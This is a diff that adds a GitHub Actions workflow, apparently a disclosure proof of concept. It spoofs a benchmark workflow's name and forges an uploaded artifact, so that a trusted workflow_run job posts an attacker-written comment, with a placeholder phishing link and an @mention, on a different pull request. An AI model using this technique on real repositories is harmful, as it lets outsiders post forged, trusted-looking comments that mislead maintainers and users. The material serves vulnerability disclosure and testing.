@@ -1,0 +1,29 @@
+# Attacker-supplied workflow that only SPOOFS the name of the workflow that
+# bench-comment.yml watches for via workflow_run.  Runs in the base repo
+# because `pull_request` workflows from the PR head are used.
+name: "Compare performance to base branch"
+on:
+  pull_request:
+permissions: read-all
+jobs:
+  fake-bench:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Forge bench_results artifact
+        run: |
+          mkdir -p bench_results
+          # target a DIFFERENT pull request than the one that triggered this run
+          printf '1\n' > bench_results/pr_number.txt
+          cat > bench_results/comparison.md <<'MD'
+          ### [POC] attacker-controlled comment body
+
+          This comment was NOT produced by the benchmark job. It was forged by an
+          outside contributor through the `workflow_run` artifact trust boundary.
+
+          - phishing link: https://example.invalid/claim-reward
+          - mention: @matter-labs
+          MD
+      - uses: actions/upload-artifact@v4
+        with:
+          name: bench_results
+          path: bench_results/
